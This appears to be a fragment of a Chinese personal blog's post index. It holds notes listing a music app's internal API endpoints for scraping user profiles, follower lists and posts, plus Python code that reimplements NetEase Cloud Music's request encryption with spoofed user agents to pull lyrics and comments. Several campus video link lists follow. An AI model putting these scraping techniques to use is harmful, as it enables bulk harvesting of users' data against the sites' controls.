wiki_detail.py（获取多频百科的某一词条的具体信息）中 spider.py 把两个结合，爬取全部的多频百科全部的内容 接口（都为 GET 方法）以下的 pageSize 为返回的内容数量，memberId 为用户的 id关注 apiapi = http://duopin_app_api.hearinmusic.com/app/fans/idolList?params = pageSize:20, isAsc:desc, pageNum:1, memberId:%s 例子：http://duopin_app_api.hearinmusic.com/app/fans/idolList?pageSize=20isAsc=descpageNum=1memberId=104 粉丝 apiapi = http://duopin_app_api.hearinmusic.com/app/fans/fansList?params = pageSize:20, isAsc:desc, pageNum:1, memberId:%s 例子：http://duopin_app_api.hearinmusic.com/app/fans/fansList?pageSize=20isAsc=descpageNum=1memberId=104 个人信息 apiapi = http://duopin_app_api.hearinmusic.com/app/member/info?params = memberId:%s 例子：http://duopin_app_api.hearinmusic.com/app/member/info?memberId=104 查看个人发布 apiapi = http://duopin_app_api.hearinmusic.com/app/article/list3?params = pageSize:20, pageNum:1, memberId:%s 例子：http://duopin_app_api.hearinmusic.com/app/article/list3?pageSize=20pageNum=1memberId=104 评论 apiapi = http://duopin_app_api.hearinmusic.com/app/comment/listparams = memberId:%s 例子：http://duopin_app_api.hearinmusic.com/app/comment/list?articleId=5915 以下的 id 为文章的 id信号(文章)url APIapi = http://dropinapp.hearinmusic.com/#/signalDet?params = id:%s 例子：http://dropinapp.hearinmusic.com/#/signalDet?id=5915 信号(文章)分享 urlapi = http://dropinapp.hearinmusic.com/#/signalShare?params = id:%s 例子：http://dropinapp.hearinmusic.com/#/signalShare?id=5915 信号(文章)apiapi = http://duopin_app_api.hearinmusic.com/app/article/v1_0/detailWeb?params = id:%s 例子：http://duopin_app_api.hearinmusic.com/app/article/v1_0/detailWeb?id=5915 以下的 id 为频段的 id频段 info_apiapi = http://duopin_app_api.hearinmusic.com/app/channel/detail?params = id:%s 例子：http://duopin_app_api.hearinmusic.com/app/channel/detail?id=976 以下的 orderType 为请求的类型，pageSize 为返回的内容数量，channelIds 为频段的 id频段 content_apiapi = http://duopin_app_api.hearinmusic.com/app/article/list3?params = orderType:CHANNEL_NEW, pageSize:20, channelIds:%s, pageNum:1 例子：http://duopin_app_api.hearinmusic.com/app/article/list3?orderType=CHANNEL_NEWpageSize=20channelIds=976pageNum=1 首页 apiapi = http://duopin_app_api.hearinmusic.com/app/article/list3?params = orderType:HOME, pageSize:20, pageNum:1 例子：http://duopin_app_api.hearinmusic.com/app/article/list3?orderType=HOMEpageSize=20pageNum=1 研究所 apiapi = http://duopin_app_api.hearinmusic.com/app/search/research# 无params 以下的 keyword 为关键字搜索 apiapi = http://duopin_app_api.hearinmusic.com/app/search/searchAll?params = keyword:avicii 例子：http://duopin_app_api.hearinmusic.com/app/search/searchAll?keyword=avicii","tags":["python","爬虫","多频"],"categories":["python"]},{"title":"【网易云】网易云解参数（获取网易云歌词，获取评论同理）","path":"//coding/python/cloudmusic_encseckey.html","content":"真正日常使用只需要输入 4 行，修改两行，很简单原视频（p46-p52） 代码部分以下代码基于上面的视频：（视频内为获取网易云评论， 此代码也是）params_encSecKey.py #视频参考：https://www.bilibili.com/video/BV1i54y1h75W?p=48import requestsimport randomimport jsonfrom Crypto.Cipher import AESfrom base64 import b64encodeclass Netease_params(object): def __init__(self, data): #字典要成字符串（json）再加密 self.data = data #服务于d的 self.e = 010001 self.f = 00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 self.g = 0CoJUm6Qyw8W8jud self.i = vlgPRPyGhwA6F4Sq #手动固定的 =》网页是随机的 def set_user_agent(self): USER_AGENTS = [ Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0), Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322), Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30), Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30), Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6, Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1, Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0, Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5 ] user_agent = random.choice(USER_AGENTS) return user_agent def get_encSecKey(self): return 6ea19f618d09893013feb207e6953ab0d04831ccf86095147970745a825a0f3288ad0bfdb802ffd5876394599d179b65785e679b23ae38035d476872f5270c26f7e15f0e2de0da92ac7fdd1de6a965642a67707d3b204d48a3a3c66fe536c9e2056d2032c884d764cf419e8ce7bd245f56bde140deccbaed83995285ee66ccda #转换成16的倍数 def to_16(self, data): pad = 16 -len(data) % 16 data += chr(pad) * pad return data def enc_params(self, data, key): #加密过程 iv = 0102030405060708 data = self.to_16(data) #加密的内容必须是16的倍数 aes = AES.new(key=key.encode(utf-8), IV=iv.encode(utf-8), mode=AES.MODE_CBC) #创建加密器 bs = aes.encrypt(data.encode(utf-8)) #加密 return str(b64encode(bs), utf-8) #转成字符串，这个bs不能直接decode，要先转成b64 #数据加密两次 def get_params(self, data): first = self.enc_params(data, self.g) secend = self.enc_params(first, self.i) return secend def run(self, url): data = params: self.get_params(json.dumps(self.data)), encSecKey:self.get_encSecKey() headers = User-Agent:self.set_user_agent() response = requests.post(url, data=data, headers=headers).json() #print(response) return responseif __name__ == __main__: url = https://music.163.com/weapi/song/lyric?csrf_token= data = csrf_token: , id: 1398764652, lv: -1, tv: -1 wyy = Netease_params(data) wyy.run(url) 获取参数方法 此处为歌词的 data，csrf_token 可以空 获取网易云评论 打开任意一首歌曲（演示 ） 按 F12，找到响应内容为评论的请求此处的 url 就是后面要使用的 url 按顺序点击 格式化一下 在此处添加断点 按 F5 刷新 按”1“处，直到”2”处的链接为评论的请求 url（rid，threadId 最后面的数字为歌曲 id） 把方框内的拷贝到 data 里面，并修改为字典的格式（注意csrf_token 可以空，全部的内容都为字符串）Tip 其中 url 和 data 的获取过程请参考上面的步骤，如果看不懂，请参考最上方的视频 使用方法参考最下方的 if __name__ == __main__ 部分，此处为四行， 只需要修改 url 和 data 就可以获取不同的信息","tags":["python","爬虫","网易云"],"categories":["python"]},{"title":"【西邮】大一那些事","path":"//life/goodbye_02202016.html","content":"我的大一一点小秘密：我不轻易告诉别人，我看了之后想哭标题点击后直接转跳 B 站 1.【西邮】经管院：冠军绝不是终点！ 2.【西邮·佛山三中】西邮灰 × 三中绿 3.【西邮】腾飞杯篮球赛混剪（经管 VS 自动化） 4.【西邮】青春与 Avicii 的碰撞! 5.【西邮】你有见过这么燃的校运会吗！ 6.It’s a good time when we are together（特别现场版） 7.【西邮】雁塔：这次应该真比招生减章好","tags":["西安邮电大学","雁塔校区"],"categories":["大学生活"]},{"title":"【西邮】校园有推播，生活更快乐","path":"//life/yanta_union.html","content":"西安邮电大学校学生会雁塔分会标题点击后直接转跳 B 站 1.【西邮】3v3 篮球混剪 2.【西邮】第一季融媒体大赛开场视频 3.【西邮】我们的回忆西邮学生会雁塔分会 2020 年第二次例会开场视频 4.【西邮】漫漫上学路西邮学生会雁塔分会 2021 年第一次例会开场视频 5.【西邮】快进来听歌！！！西邮第十六届“校园十佳歌手”复赛大赛开场视频 6.【西邮】学期总结西邮学生会雁塔分会 2020-2021 第二学期总结","tags":["西安邮电大学","雁塔校区","校学生会"],"categories":["大学生活"]},{"title":"【西邮】2021腾飞杯","path":"//life/xupt_2021tfb.html","content":"经济管理，无与伦比2021.3.31 经管 VS 邮政视频下载 2021.4.2 邮政 VS 通院视频下载 2021.4.7 经管 VS 通院视频下载 2021.4.9 经管 VS 自动化视频下载 2021.4.12 邮政 VS 理学院视频下载 2021.4.19 经管 VS 电院 女篮视频下载 2021.4.20 avicii·腾飞杯","tags":["西安邮电大学","经济与管理学院","篮球","腾飞杯","雁塔校区"],"categories":["大学生活"]},{"title":"【西邮】经济管理无与伦比","path":"//life/jjgl_nb.html","content":"西安邮电大学经济与管理学院学生会标题点击后直接转跳 B 站 1.【西安邮电大学】这里有雁塔的美景！！！西安邮电大学经济与管理学院学生会第一次例会开场视频 2.【西邮】经管院：冠军绝不是终点！西安邮电大学 2020 年西邮杯篮球赛决赛 3.【西邮】2020 年经管院学生会上学期一些有趣的事西安邮电大学经济与管理学院学生会第二次例会开场视频 4.【西邮】经济与管理学院广播体操预热 5.【西邮】我们创造过辉煌，也将继续辉煌（——致敬经管院学生会）西安邮电大学 2021 年经济与管理学院广播体操比赛 6.【西邮】你有见过这么燃的校运会吗！西安邮电大学第二十八届田径运动会经济与管理学院混剪 7.It’s a good time when we are together西安邮电大学经济与管理学院学生会第二次例会回顾视频 8.2020-2021 学年度总结回顾西安邮电大学经济与管理学院“时代青年展风华 传承精神谐新章”文艺汇演暨学年总结 学生会视频回顾原视频","tags":["西安邮电大学","经济与管理学院","院学生会"],"categories":["大学生活"]}]